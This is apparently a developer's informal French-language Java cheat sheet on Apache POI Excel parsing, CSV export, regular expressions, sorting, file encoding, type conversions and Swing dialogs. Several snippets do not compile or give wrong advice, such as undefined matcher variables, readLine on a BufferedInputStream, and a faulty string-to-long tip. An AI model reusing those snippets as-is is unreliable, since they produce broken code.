  	cell.setCellFormula("IF(M"+numrow+">L"+numrow+",IF(M"+numrow+"<(R"+numrow+"+10),\"Pas de retard\",MIN((M"+numrow+"-L"+numrow+"),(M"+numrow+"-(R"+numrow+"+10)))),\"Pas de retard\")");
pour lire un gros fichier avec poi :
      ma classe main :
                                    	        FileInputStream fin = new FileInputStream(new File("C:/temp/wec/jalonpanama.xls"));
                              	        //FileInputStream fin = new FileInputStream(new File("C:/temp/wec/test1.xml"));
                              	        // create a new org.apache.poi.poifs.filesystem.Filesystem
                              	        POIFSFileSystem poifs = new POIFSFileSystem(fin);
                              	        // get the Workbook (excel part) stream in a InputStream
                              	        InputStream din = poifs.createDocumentInputStream("Workbook");
                              	        // construct out HSSFRequest object
                              	        HSSFRequest req = new HSSFRequest();
                              	        // lazy listen for ALL records with the listener shown above
                              	        PoiEvent2 poie = new PoiEvent2();
                              	        poie.initiate("C:/temp/wec/jalonpanama.txt");
                              	        req.addListenerForAllRecords(poie);
                              			 // create our event factory
                              	        HSSFEventFactory factory = new HSSFEventFactory();
                              	        // process our events based on the document input stream
                              	        factory.processEvents(req, din);
                              	        // once all the events are processed close our file input stream
                              	        fin.close();
                              	        // and our document input stream (don't want to leak these!)
                              	        din.close();
                              	        poie.getFos().close();
                              	        System.out.println("done.");    			
                           	        }
                           	        catch (Exception e)
                          	        {
                          	            e.printStackTrace();
                          	        }

      mon listener:
                                  /**
                             * This example shows how to use the event API for reading a file.
                             */
                            public class PoiEvent2 implements HSSFListener
                            {
                                private SSTRecord sstrec;
                            	private BoundSheetRecord bsr;
                            	private BufferedOutputStream fos;
                            
                            	public BufferedOutputStream getFos() {
                            		return fos;
                            	}
                            public void initiate(String path) throws Exception
                            {
                            	FileOutputStream outputFile = new FileOutputStream(new File(path)); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                            	fos = new BufferedOutputStream(outputFile);
                            }
                                /**
                                 * This method listens for incoming records and handles them as required.
                                 * @param record    The record that was found while reading.
                                 */
                            public void processRecord(Record record)
                            	      {
                            		try
                            		{
                                    switch (record.getSid())
                            	          {
                                        // the BOFRecord can represent either the beginning of a sheet or the workbook
                                        case BOFRecord.sid:
                                            BOFRecord bof = (BOFRecord) record;
                                            if (bof.getType() == bof.TYPE_WORKBOOK)
                            	                  {
                            //                	fos.write("Encountered workbook\n".getBytes());
                                                
                                                // assigned to the class level member
                                            } else if (bof.getType() == bof.TYPE_WORKSHEET)
                            	                  {
                            //                	fos.write("Encountered sheet reference\n".getBytes());
                                            }
                                            break;
                                        case BoundSheetRecord.sid:
                                            BoundSheetRecord bsr = (BoundSheetRecord) record;
                            //                String toto ="New sheet named: " + bsr.getSheetname()+"\n"; 
                            //                fos.write(toto.getBytes());
                                            break;
                                        case RowRecord.sid:
                                            RowRecord rowrec = (RowRecord) record;
                            //                String toto2 ="Row found, first column at "+ rowrec.getFirstCol() + " last column at " + rowrec.getLastCol()+"\n";
                            //                fos.write(toto2.getBytes());
                                            break;
                                        case NumberRecord.sid:
                                            NumberRecord numrec = (NumberRecord) record;
                                            if (numrec.getColumn()==7)
                                            {
                                            String toto3 ="Cell found with value " + numrec.getValue() + " at row " + numrec.getRow() + " and column " + numrec.getColumn()+"\n";
                                            fos.write(toto3.getBytes());
                                            }
                                            break;
                                            // SSTRecords store a array of unique strings used in Excel.
                                        case SSTRecord.sid:
                                            sstrec = (SSTRecord) record;
                            //                for (int k = 0; k < sstrec.getNumUniqueStrings(); k++)
                            //	                  {
                            //                	String toto4 ="String table value " + k + " = " + sstrec.getString(k)+"\n";
                            //                    fos.write(toto4.getBytes());
                            //                }
                                            break;
                                        case LabelSSTRecord.sid:
                                            LabelSSTRecord lrec = (LabelSSTRecord) record;
                                            if (lrec.getColumn()==54)
                                              {
                                              	lrec.getColumn();
                                              	String toto5 ="String cell found with value " + sstrec.getString(lrec.getSSTIndex())+ " at row " + lrec.getRow() + " and column " + lrec.getColumn()+"\n";
                                                fos.write(toto5.getBytes());
                                              } 
                                            
                                            break;
                                    }
                            	      }
                            		catch (Exception e)
                            		{
                            			System.out.println(e);
                            		}
                                }
                            }
              voici un autre listener poi qui permet de recuperer une date: 
                              public class FindCodeAffaireAndCPIByIdLot implements HSSFListener
                              {
                              	private SSTRecord sstrec;
                              	private BoundSheetRecord bsr;
                              	private String idLot;
                              	private int lookForCodeAffaire=0;
                              	private UnicodeString codeAffaire= new UnicodeString("");
                              	private UnicodeString numCPI= new UnicodeString("");
                              	private UnicodeString npro= new UnicodeString("");
                              	private UnicodeString previousnpro= new UnicodeString("");
                              	private String datecpi= "";
                              	private UnicodeString dom= new UnicodeString("");
                              	private UnicodeString previousdom= new UnicodeString("");
                              	private UnicodeString nrespro= new UnicodeString("");
                              	 
                              	/**
                              	 * This method listens for incoming records and handles them as required.
                              	 * @param record    The record that was found while reading.
                              	 */
                              	public void processRecord(Record record)
                              	{
                              		try
                              		{
                              			switch (record.getSid())
                              			  {
                              			case NumberRecord.sid:
                              				NumberRecord numrec = (NumberRecord) record;
                              				if (numrec.getColumn()==7 && Long.toString(Math.round(numrec.getValue())).equals(idLot))
                              				{
                              					lookForCodeAffaire=numrec.getRow();
                              					npro = previousnpro;
                              					dom = previousdom;
                              				}
                              				if (numrec.getColumn()==121 && lookForCodeAffaire==numrec.getRow())
                              				{
                              						//lrec.getColumn();
                              					SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd/MM/yyyy"); // attention n'est pas threadsafe.
                              					java.util.Date utilDate  = HSSFDateUtil.getJavaDate(numrec.getValue());
                              					datecpi = simpleDateFormat.format(utilDate);
                              				}
                              				break;
                              			case SSTRecord.sid:
                              				sstrec = (SSTRecord) record;
                              				break;
                              			case LabelSSTRecord.sid:
                              				LabelSSTRecord lrec = (LabelSSTRecord) record;
                              				if (lrec.getColumn()==54 && lookForCodeAffaire==lrec.getRow())
                              				  {
                              					//lrec.getColumn();
                              					codeAffaire = sstrec.getString(lrec.getSSTIndex());
                              				  } 
                              				if (lrec.getColumn()==135 && lookForCodeAffaire==lrec.getRow())
                              				{
                              					//lrec.getColumn();
                              					numCPI = sstrec.getString(lrec.getSSTIndex());
                              				}
                              				if (lrec.getColumn()==0)
                              				{
                              					
                              					//lrec.getColumn();
                              					previousnpro = sstrec.getString(lrec.getSSTIndex());
                              				}
                              				if (lrec.getColumn()==3)
                              				{
                              					//lrec.getColumn();
                              					previousdom = sstrec.getString(lrec.getSSTIndex());
                              				}
                              				if (lrec.getColumn()==50 && lookForCodeAffaire==lrec.getRow())
                              				{
                              					//lrec.getColumn();
                              					nrespro = sstrec.getString(lrec.getSSTIndex());
                              				}
                              				break;
                              				 
spreadsheet :
pour ecire et lire un fichier excell spreadsheet : mais peut etre que c'est mieux d'utiliser jxl (non! ne pas utiliser jxl il est depasse par POI qui fait tout et en plus xlsx)
	Pour ecrire un fichier excell spreadsheet dans un fichier si on a un tableau de bytes (avec f1j11swing.jar)
	public static void tableauDeBytesVersFichier (byte[] tableau, java.io.File fichier) throws Exception {
			FileOutputStream out = new BufferedOutputStream(new FileOutputStream(fichier)); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
			BookImpl excell =new BookImpl();
			excell.read(tableau);
			excell.write(null,out,JBook.eFileExcel97);
	}
*********************************
pour ecrire un fichier excell(csv) au bon format d'encodage
			response.addHeader("content-disposition", "attachement;filename=export.csv");
			response.setContentType("application/vnd.ms-excel");
			ou
			response.setContentType("application/excel;charset=ISO-8859-1");
				
			ServletOutputStream outstr = response.getOutputStream();
			Collection ce = exportExcelcmd.getExportData();
			Object [] cetab = (Object[]) ce.toArray();
			for(int i=0;i<cetab.length;i++) {
				String unelig = (String) cetab[i] + "\n"; // \n cree une ligne tandisque que \t cree une colonne! (dans une ligne mettre \t)
				outstr.write(unelig.getBytes("ISO-8859-1"));
			}
		} catch (Exception e) {	
********************************
pour merger des cellules avec xspreadsheet: (f1j11swing.jar)
					CellFormat cf = book.getCellFormat();
					cf.align().setMergeCells(true);
					book.setSelection(0, 3, 0, 4);
					book.setCellFormat(cf);
					// Merges range D1:E1 (horizontal)
					book.setSelection(1, 3, 2, 4);
					book.setCellFormat(cf);
					// Merges range D2:E3 (horizontal & vertical)
pour lire un fichier csv utiliser la librairie opncsv-1.8.jar avec la class CSVReader qui possede une methode "readNext"
			private CSVReader csvReadingFile(FileInputStream fileInputStream) {
			CSVReader csvReader = null;
			NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode!
			InputStreamReader inputStreamReader = null;
			try {
			/** read file as UTF-8 charset */
			inputStreamReader = new InputStreamReader(fileInputStream, Constants.UTF_8);
			/** read csv file with separator as parameter */
			csvReader = new CSVReader(inputStreamReader, Constants.CSV_FIELDS_SEPARATOR);
			/** close input stream */
		} catch (Exception e) {
			...
			closeInputStream(fileInputStream);
		}
		return csvReader;
	}

**********************************
pour retoucher un fichier excell et l'envoyer en response: avec f1j11swing.jar spreadsheet
					package renault.rad.struts.samples.excel.action;
					import javax.servlet.http.HttpServletRequest;
					import javax.servlet.http.HttpServletResponse;
					import org.apache.struts.action.ActionForm;
					import org.apache.struts.action.ActionForward;
					import org.apache.struts.action.ActionMapping;
					import renault.rad.struts.session.SessionDataManager;
					import renault.rad.struts.RadAction;
					import java.io.*;
					import javax.servlet.*;
					import javax.servlet.http.*;
					import com.f1j.ss.*;
					/**
					* @version 1.0
					* @author
					*/
					public class ExcelAction extends RadAction {
					
					public ActionForward executeAction(
					ActionMapping mapping,
					ActionForm form,
					SessionDataManager mgr,
					HttpServletRequest request,
					HttpServletResponse response)
					throws Exception {
					
					// 2 Inform the browser that you are sending an Excel file and get the
					// response's output stream:
					response.setContentType("application/vnd.ms-excel");
					ServletOutputStream out = response.getOutputStream() ;
					
					// 3 Create a new e.Spreadsheet Designer workbook:
					BookImpl book = new BookImpl();
					
					// 4 Lock the workbook before making changes:
					book.getLock();
					try {
					
					//importation du fichier excel modèle
					book.read("C:\\Documents and Settings\\Administrator\\My Documents\\IBM\\wsappdev51\\workspace\\ptlWeb\\WebContent\\excel\\ExportExcel97.xls", new com.f1j.ss.ReadParams(BookModelImpl.eFileExcel97));
					Sheet dataSheet = book.getSheet(1);
					
					//On insère des valeurs aleatoires pour le graphique
					for(int i=0; i<25; i++)
					dataSheet.setFormula(i,1,"rand()*"+(10*i/4));
					
					//On modifie le nom de l'onglet pour le fun ..
					dataSheet.setName("POUET");
					
					//Mais ca sert à  rien vu qu'on le cache
					dataSheet.setHiddenState(com.f1j.ss.Constants.eSheetVeryHidden);
					
					}
					catch(Throwable e) {
					System.out.println(e.getMessage());
					}
					finally {
					book.releaseLock();
					datasheet=null;
					}
					
					//On place le travail dans un BookModelImpl ...
					BookModelImpl b = new BookModelImpl(book);
					
					//Ce qui permet de l'envoyer facilement au browser du client
					b.write(out, new com.f1j.ss.WriteParams(BookModelImpl.eFileExcel97));
					
					return null;
					}
					} 
********************************* 
LINKçeeçeeçregexpçeeçeeç	
Pour utilisation des expressions regulieres conditionnelles avec sorte de callback en java pour trouver un caractère: regexp : attention !!! ca ne marche pas pareil sur unix: super galere donc eviter. Ruser avec Substring plutot
ici on cherche des coommentaires: *
private boolean contientCommentStart(String ligne) {
        StringBuffer resultString = new StringBuffer();
        String regexp="/\\*([A-Z])";
		Pattern pattern = Pattern.compile(regexp); // le mettre en tete de classe en static final car ca bouffe memoire
		Matcher matcher = pattern.matcher(ligne);
		while (matcher.find()) {
		  System.out.println(m.group(1)); // renvoit donc contenu de la premiere parenthese (commence par 1)
          regexMatcher.appendReplacement(resultString, "replacement"); // ajoute dans resultString (le stringbuffer) en remplacant TOUT regexp par "remplacement" 
		}
        regexMatcher.appendTail(resultString); // ajoute la fin du texte dans resultString (le stringbuffer)
	} 
	autre exemple:
	private boolean contient(String ligne) {
		Pattern pattern = Pattern.compile("\\[COMP"); // le mettre en tete de classe en static final car ca bouffe memoire
		Matcher matcher = pattern.matcher(ligne);
		while (matcher.find()) {
			return true;
		}
		return false;
	}
	exemples : (le design pattern de pspad: rempalcement avec $1.. marche!)
	ici on remplace tous les chiffres colle a des chars par la meme chose separe par des espaces :
	                    si whitespace mettre \\s (voir plus bas)
            				if (string.matches(".*[0-9][a-z].*") || string.matches(".*[a-z][0-9].*"))
            			{
            				string = string.replaceAll("(.*[0-9])([a-z].*)", "$1 $2");
            				string = string.replaceAll("(.*[a-z])([0-9].*)", "$1 $2");
            				
            			}
	     Pattern pattern1 = Pattern.compile("//\\D{2,3}\\d+[_]"); cherche "//sdf5646540_" ou "//DF54455_"
	 Summary of regular-expression constructs
                            Construct 	Matches
                             
                            Characters
                            x 	The character x
                            \\ 	The backslash character
                            \0n 	The character with octal value 0n (0 <= n <= 7)
                            \0nn 	The character with octal value 0nn (0 <= n <= 7)
                            \0mnn 	The character with octal value 0mnn (0 <= m <= 3, 0 <= n <= 7)
                            \xhh 	The character with hexadecimal value 0xhh
                            \uhhhh 	The character with hexadecimal value 0xhhhh
                            \t 	The tab character ('\u0009')
                            \n 	The newline (line feed) character ('\u000A')
                            \r 	The carriage-return character ('\u000D')
                            \f 	The form-feed character ('\u000C')
                            \a 	The alert (bell) character ('\u0007')
                            \e 	The escape character ('\u001B')
                            \cx 	The control character corresponding to x
                             
                            Character classes
                            [abc] 	a, b, or c (simple class)
                            [^abc] 	Any character except a, b, or c (negation) ne contient pas
                            [a-zA-Z] 	a through z or A through Z, inclusive (range)
                            [a-d[m-p]] 	a through d, or m through p: [a-dm-p] (union)
                            [a-z&&[def]] 	d, e, or f (intersection)
                            [a-z&&[^bc]] 	a through z, except for b and c: [ad-z] (subtraction)
                            [a-z&&[^m-p]] 	a through z, and not m through p: [a-lq-z](subtraction)
                             
                            Predefined character classes
                            . 	Any character (may or may not match line terminators)
                            \d 	A digit: [0-9]
                               d+ c'est un chiffre nombre
                            \D 	A non-digit: [^0-9]
                            \s 	A whitespace character: [ \t\n\x0B\f\r] (exemple: Pattern.compile("\\s(W0[A-Z0-9]{3,6}\\.[TV][A-Z0-9]{2,11})\\s");)
                      			       \\s c'est un espace \\s* c'est 0 ou x espaces
                            \S 	A non-whitespace character: [^\s]
                            \w 	A word character: [a-zA-Z_0-9]
                            \W 	A non-word character: [^\w]
                             
                            POSIX character classes (US-ASCII only)
                            \p{Lower} 	A lower-case alphabetic character: [a-z]
                            \p{Upper} 	An upper-case alphabetic character:[A-Z]
                            \p{ASCII} 	All ASCII:[\x00-\x7F]
                            \p{Alpha} 	An alphabetic character:[\p{Lower}\p{Upper}]
                            \p{Digit} 	A decimal digit: [0-9]
                            \p{Alnum} 	An alphanumeric character:[\p{Alpha}\p{Digit}]
                            \p{Punct} 	Punctuation: One of !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
                            \p{Graph} 	A visible character: [\p{Alnum}\p{Punct}]
                            \p{Print} 	A printable character: [\p{Graph}]
                            \p{Blank} 	A space or a tab: [ \t]
                            \p{Cntrl} 	A control character: [\x00-\x1F\x7F]
                            \p{XDigit} 	A hexadecimal digit: [0-9a-fA-F]
                            \p{Space} 	A whitespace character: [ \t\n\x0B\f\r]
                             
                            Classes for Unicode blocks and categories
                            \p{InGreek} 	A character in the Greek block (simple block)
                            \p{Lu} 	An uppercase letter (simple category)
                            \p{Sc} 	A currency symbol
                            \P{InGreek} 	Any character except one in the Greek block (negation)
                            [\p{L}&&[^\p{Lu}]]  	Any letter except an uppercase letter (subtraction)
                             
                            Boundary matchers
                            ^ 	The beginning of a line
                            $ 	The end of a line
                            \b 	A word boundary
                            \B 	A non-word boundary
                            \A 	The beginning of the input
                            \G 	The end of the previous match
                            \Z 	The end of the input but for the final terminator marche pas pour les retours chariot 
                            \z 	The end of the input
                             
                            Greedy quantifiers
                            X? 	X, once or not at all
                            X* 	X, zero or more times
                            X+ 	X, one or more times
                            X{n} 	X, exactly n times
                            X{n,} 	X, at least n times
                            X{n,m} 	X, at least n but not more than m times
                             
                            Reluctant quantifiers
                            X?? 	X, once or not at all
                            X*? 	X, zero or more times
                            X+? 	X, one or more times
                            X{n}? 	X, exactly n times
                            X{n,}? 	X, at least n times
                            X{n,m}? 	X, at least n but not more than m times
                             
                            Possessive quantifiers
                            X?+ 	X, once or not at all
                            X*+ 	X, zero or more times
                            X++ 	X, one or more times
                            X{n}+ 	X, exactly n times
                            X{n,}+ 	X, at least n times
                            X{n,m}+ 	X, at least n but not more than m times
                             
                            Logical operators
                            XY 	X followed by Y
                            X|Y 	Either X or Y
                            (X) 	X, as a capturing group
                             
                            Back references
                            \n 	Whatever the nth capturing group matched
                             
                            Quotation
                            \ 	Nothing, but quotes the following character
                            \Q 	Nothing, but quotes all characters until \E
                            \E 	Nothing, but ends quoting started by \Q
                             
                            Special constructs (non-capturing)
                            (?:X) 	X, as a non-capturing group
                            (?idmsux-idmsux)  	Nothing, but turns match flags on - off
                            (?idmsux-idmsux:X)   	X, as a non-capturing group with the given flags on - off
                            (?=X) 	X, via zero-width positive lookahead
                            (?!X) 	X, via zero-width negative lookahead
                            (?<=X) 	X, via zero-width positive lookbehind
                            (?<!X) 	X, via zero-width negative lookbehind
                            (?>X) 	X, as an independent, non-capturing group
--------
pour spliter un string: decouper un string en plusieurs morceaux(tooken tocken toocken token separateur): on coupe là  ou il y a marque "blabla" en enlevant "blabla:
si pattern.toString = "blabla" // pattern c pour le expression regulieres.. a eviter (voir pq ci dessus...)
String[] split = ligne.split(pattern.toString());
			for (int i = 0; i < split.length; i++) {
				system.out.println(split[i];
				}
				remaque: le caractère d'echappement est "\\" si par exemple on veut splitter sur "|" il faut mettre "\\|"
				si on veut splitter avec "\" ou "\\" il faut faire : return ligne.split(Pattern.quote("\\")); //blackslash mais c'est plus long à l'execution. "\\\\" semble fonctionner
en JAVA =<1.3 : 
    StringTokenizer st = new StringTokenizer(mon_string, "mon separateur"); // déconseillé d'utiliser StringTokenizer. préférer split ou java.util.regex
    String bli = (String)st.nextElement()) ;	
--------
pour classer les elements d'une liste dans l'ordre alphabetique:
Collections.sort(namesList);
		ou nameList est une liste. Attention c'est un ordre alpha pas top avec les chiffres: besoin mettre un zero avant les dizaines...
pour faire un tri (trier ordonner ordre) une ArrayList qui contient des objets: LINKordrelkjglfkdjss
    avec les lambdas: 
        personList.sort((p1, p2) -> p1.firstName.compareTo(p2.firstName));
        les dates les chiffres : 
        hour.sort((p1, p2) -> p1.before(p2)?-1:1); // tri du plus petit au plus grand
	ArrayList<SyntheseObj> synthese = new ArrayList<SyntheseObj>(indic.size()); // liste à trier
	Collections.sort(synthese, new ComparSynthese());
	mais c'est mieux de faire pour les acces concurents:
    malistnontriee=uneliste... 
    Set<T> unSetTrie = new ConcurrentSkipListSet<Employee>();
    unSetTrie= new ConcurrentSkipListSet<Element>(new ComparSynthese());
    unSetTrie.addAll(malistnontriee); // le tri se fait là. 
	public class ComparSynthese implements Comparator
	{
		public int compare(Object o1, Object o2) {
			SyntheseObj s1= (SyntheseObj)o1;
			SyntheseObj s2= (SyntheseObj)o2;
			// si c'est des chiffres:
										if (Integer.parseInt(s1.val2)>Integer.parseInt(s2.val2)) return 1;
										else if (Integer.parseInt(s1.val2)<Integer.parseInt(s2.val2)) return -1;
										else return 0; // meme niveau
			// si c'est caracteres (string)  
										int i = 0;
										if (s1.getLabel().compareTo(s2.getLabel())>0) i=1;
										else if (s1.getLabel().compareTo(s2.getLabel())<0) i=-1;
										else i=0;
										return i;
		}
	}
pour faire un tri on peut aussi utiliser l'objet java.util.TreeSet();
------
pour savoir quel string passe en premier dans un ordre alphabetique : 
		"laquelle est la 1ere dans l'ordre alphabetique",  s1.compareTo(s2). ca retourne CHIFFRE(attention pas que des 1 et 0) negatif si c'est s1 < s2, un positif si s1 > s2 et 0 si c'est egale. 
------
Pour ecrire des lignes dans un fichier
/** Write fixed content to the given file. */
  void write() throws IOException  {
    log("Writing to file named " + fFileName + ". Encoding: " + fEncoding);
    Writer out = new OutputStreamWriter(new FileOutputStream(fFileName), fEncoding); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
    try {
      out.write(FIXED_TEXT);
    }
    finally {
      out.close();
    }
  }
// AVANT: mais pb encodage ci-dessous
//creation ou ajout dans le fichier texte
		try {
		// attention fileWriter et FileReader utilisent l'encodage du systeme!!! donc pas bon!
			FileWriter fw = new FileWriter (fichier);
			BufferedWriter bw = new BufferedWriter (fw);
			PrintWriter fichierSortie = new PrintWriter (bw); 
				fichierSortie.println (chaine+"\n test de lecture et ecriture !!"); 
			fichierSortie.close();
			System.out.println("Le fichier " + fichier + " a ete cree!"); 
		}
		catch (Exception e){
			System.out.println(e.toString());
		}		

-----------
Pour lire les lignes d'un fichier: 
FileInputStream lire = new FileInputStream(fichier); // fichier est un File
			BufferedReader reader = new BufferedReader(new InputStreamReader(lire));
			NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode! // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage :-))
			BufferedInputStream reader = new BufferedInputStream(lire);
			String ligne;
			while ((ligne=reader.readLine())!=null){
				System.out.println(ligne);
			}
			reader.close(); 
pour lire les lignes d'un fichier en conservant l'encodage parser un fichier:

  /** Read the contents of the given file. */
  void read() throws IOException {
    log("Reading from file.");
        String request = new Scanner(new ClassPathResource("json/request.json").getFile()).useDelimiter("\\Z").next(); // voir regexp LINKçeeçeeçregexpçeeçeeç
        scanner.useDelimiter(expessionreguliere);// a partir de maintenant quand je vais faire scanner.next() et scanner.hasNext() il va se baser sur expressionreguliere pour passer au suivant
        scanner.useDelimiter(System.getProperty("line.separator")); // pour delimiter selon retour chariot
    AVANT:
    String NL = System.getProperty("line.separator"); // a partir de java 5.1 on peut mettre "%n" // recupère prop de la jvm voir LINKù*ù
    StringBuilder text = new StringBuilder();
    Scanner scanner = new Scanner(new FileInputStream(fFileName), fEncoding);
    try {
      while (scanner.hasNextLine()){
        text.append(scanner.nextLine() + NL);
      }
    }
    finally{
      scanner.close();
    }
    log("Text read in: " + text);
  }
Pour utiliser readLine() qui permet de lire un fichier encode en utf8 et conserver son encodage : 
        	/** Reads UTF-8 character data; lines are terminated with '\n' */ 
        	public static String readLine(InputStream in) throws IOException 
        	{
        		ByteArrayOutputStream buffer = new ByteArrayOutputStream(); 
        		while (true) 
        		{ 
        			int b = in.read();
        			if (b < 0) 
        			{
        				//throw new IOException("Data truncated");
        				break;
        			}
        			if (b == 0x0A) 
        			{
        				break; 
        			}
        			buffer.write(b); 
        		}
        		if (buffer.size()==0)
        		{
        			return null;
        		}
        		else
        		{
        			return new String(buffer.toByteArray(), "UTF-8");
        		}
        	}

-------			
			
 //test pour savoir si il y aun entete dansle tableau. Si oui on l'enleve si non on le laisse car ce sont des donnees:
 Pour savoir si un char est un numero numerique numerique est un chiffre:
      // en effet l'Action est executee deux fois donc l'entete et une donnee sont enleves: c un bug du a harmony.
      char n =  ((String[])listeKeyFormule.get(0))[0].charAt(0);
      if (!Character.isDigit(n)) listeKeyFormule.remove(0);
      
      
pour convertir un tableau d'objet en list ou meme un String[] tableau de string: on peut aussi convertir directement un tableau d'objet en stream. pas besoin de passer par une liste
		Object[] a1d = { "Hello World", new Date(), Calendar.getInstance(), };
		depuis java9: List<x> l = List.of("aaa","bbb"...);
    avant: List l = Arrays.asList(a1d); // pour creer une liste rapidement attention la liste n'est pas modifiable  (unsupportedoperationexception)
                          alors faire : images = new ArrayList<String> (Arrays.asList(dir.list()));
                                            
                                            
pour convertir une collection en list:
			      List templates  = new ArrayList(result);
A l'inverse convertir une List<Object> en Object[]: 
    List<Object> parameters = new ArrayList<Object>();
		parameters.add(idFactory);
    parameters.toArray(); -> renvoit Object[] si on fait parameters.toArray(new File[0]) -> renvoit un tableau de files     
pour convertir un List en Vecteur
	   List l = Arrays.asList(a1d); // pour creer une liste rapidement attention la liste n'est pas modifiable  (unsupportedoperationexception)
	                                             alors faire images = new ArrayList<String> (Arrays.asList(dir.list()));
    Vector v;
    v = new Vector(l);
convertir un string en list
  List<String> myList = new ArrayList<String>(Arrays.asList(s.split(","))))
pour convertir un boolean en string
    new Boolean(b).toString();    
pour convertir un byte[]  en string
      arrayOfByte2 est un byte[]
    return  new String(arrayOfByte2);
pour convertir un int en string 
							et vice et versa string en int: utiliser la classe statique Integer: Integer.parseInt ou Integer.toString(int)...
		convertir un long en string: String.valueOf(long)
		convertir un long en date puis en string: new Date(long).toString();
		convertir un string en long: long.toString() //mais attention je crois qu'il insert des espaces dans le string a chaque centaines et milliers: donc passer par int plutot(intValue())
		convertir un int en bigdecimal: int i=125; BigDecimal j = new BigDecimal(i);
		convertir un big decimal en int: ((BigDecimal) ht.get("ISFORONEFILE")).intValue()
		convertir un char en string: Character.toString(content[i]) (ou content[i] serait un char) c'est indispensable à faire dans les tags jsp sinon on va avoir l'erreur:java/lang/StringBuffer.append(C)Ljava/lang/Appendable;
		ou bien pour convertir un char[] en string: char[] password; c'est mieux de faire String.valueOf(password) avant : new String(password)
		convertir un string en char[] g.toCharArray(); 
		convertir un tableau d'objet quelquconque en array ou list :
				List<File> list =  Arrays.asList(f); // f ne doit pas etre un tableau de primitif mais un tableau d'objets
		convertir un array ou list en tableau:
				String[] stringArray = (String[])list.toArray(new String[list.size()]); 
		convertir un int en short:
				(short)3 ou bien: int toto =3; (short)toto;
		convertir un Integer en short: // je crois(... ou plutot un int?)
		    Integer.valueOf(2).shortValue();
		convertir un string en date:
				SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yy"); pour les heures minutes secondes : hh:mm:ss // attention n'est pas threadsafe.
					Date after = formatter.parse("01/01/09");
					pour ecrire une date etla formater:
                  SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy"); // attention n'est pas threadsafe.
                String toto = formatter.format(h.getVPA04_DATE()); // objet Date 
    convertir un string en float:
        String s = "1234567.1234567f";
        float f = Float.parseFloat(fs);
--------------------------------
en Swing code pour farie un save, saveAS et cancel en java:
				private String file = null; 
				private boolean saved = true; 
				... 
				public void open() { 
				boolean cancel = false; 
				       FilterFile filter = new FilterFile("sim", "Fichier simulation"); // cf composant java 
				       JFileChooser fileChooser = new JFileChooser(repDefaut); // ex repDefaut = System.getProperty("user.home");  
				       fileChooser.setDialogType(JFileChooser.FILES_ONLY); 
				       fileChooser.setFileFilter(filter); 
				       if ( fullPath != null ) { 
				               if ( !saved ) { 
				                       int result = JOptionPane.showConfirmDialog( this, 
				                               "Fichier dejà  ouvert.\nVoulez-vous le sauvegarder ?", 
				                               "Question", 
				                               JOptionPane.YES_NO_CANCEL_OPTION, 
				                               JOptionPane.QUESTION_MESSAGE ); 
				                       if ( result == JOptionPane.CANCEL_OPTION ) cancel = true; 
				                       else if ( result == JOptionPane.OK_OPTION ) // Sauvegarde du fichier en cours 
				               } 
				       } 
				       if ( !cancel ) { 
				       if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION && 
				       fileChooser.getSelectedFile() != null) { 
				               file = fileChooser.getSelectedFile().getAbsolutePath(); 
				               saved = true; 
				               // Ouverture du nouveau fichier 
				       } 
				       } 
				} 
				public void saveAs() { 
				String tmp = null; 
				       FilterFile filter = new FilterFile("sim", "Fichier simulation"); // cf composant java 
				       JFileChooser fileChooser = new JFileChooser(repDefaut); // ex repDefaut = System.getProperty("user.home"); 
				       fileChooser.setDialogType(JFileChooser.FILES_ONLY); 
				       fileChooser.setFileFilter(filter); 
				       if (fileChooser.showSaveDialog(ecran) == JFileChooser.APPROVE_OPTION) { 
				               tmp = fileChooser.getSelectedFile().getAbsolutePath(); 
				               if ( tmp.indexOf(".sim") == -1 ) tmp += ".sim"; 
				               // Sauvegarde du fichier 
				               file = tmp; 
				               saved = true; 
				       } 
				} 
				public void save() { 
				       if (file != null) { 
				               // Sauvegarde du fichier 
				               saved = true; 
				       } else saveAs(); 
				} 
--------------
Pour recuperer la liste de fichiers d'un directory:
File.list()
***********************************************************************
Utils : Utils java:
pour intercaller un string dans une liste d'autre strings : 
                       StringUtils.join(["a", "b", "c"], "--")  = "a--b--c"
                       StringUtils.join(["a", "b", "c"], null)  = "abc"

    StringUtils.join
    recuperer la liste des headers d'une requete:
      private Map<String,String> getHeadersInfo(HttpServletRequest request)
      	{
      		Map<String,String> map = new HashMap<String,String>();
      		Enumeration headerNames = request.getHeaderNames();
      		while (headerNames.hasMoreElements())
      		{
      			String key=(String) headerNames.nextElement();
      			String value = request.getHeader(key);
      			map.put(key, value);
      		}
      		return map;
      	}
      	
    /*afficher clairement une requete de preparedstatement */
                public static String preparedStatementFriendly(String query, String[] params)
              	{
              		for (String param : params) 
              		{
              			query = query.replaceFirst("\\?", param); // remplacer un point d'interrogation
              		}
              		return query;
              	}
	/**
	 * Returns true if the table is empty
	 * 
	 * @param table
	 * @return
	 * @throws Exception
	 */
	public static boolean isTableEmpty(String[] table) throws Exception {
		boolean ret = false;
		StringBuffer str = new StringBuffer();
		for (int i = 0; i < table.length; i++) {
			str.append(table[i]);
		}
		log.debug(str.toString().trim());
		log.debug(str.toString().trim().length());
		if (str.toString().trim().length() < 1)
			ret = true;
		return ret;
	}
	--------------------------------
/**
	 * Tool method returning a right string if the object is null
	 * (not "null", but "") => TODO see if return "" or null
	 * @param obj
	 * @return String
	 */
	public static String isNull(Object obj){
		if (obj != null && !((String)obj).equals("null")){
			return (String)obj;
		}
		return "";
	}
	--------------------------------
	/** 
	 * Cut a word with length>3 characters exemple: 1234567890 becomes: 123-456-789
	 * @param word
	 * @return the word cut
	 */
	public static String cutWord(String word){
		String result = "";
		if(word!=null && word.length()>3){
			result = word.substring(0, 2)+"-"+cutWord(word.substring(2, word.length()));
			return result;
		}else{
			return word;
		}
	}
--------------------------------
	/**
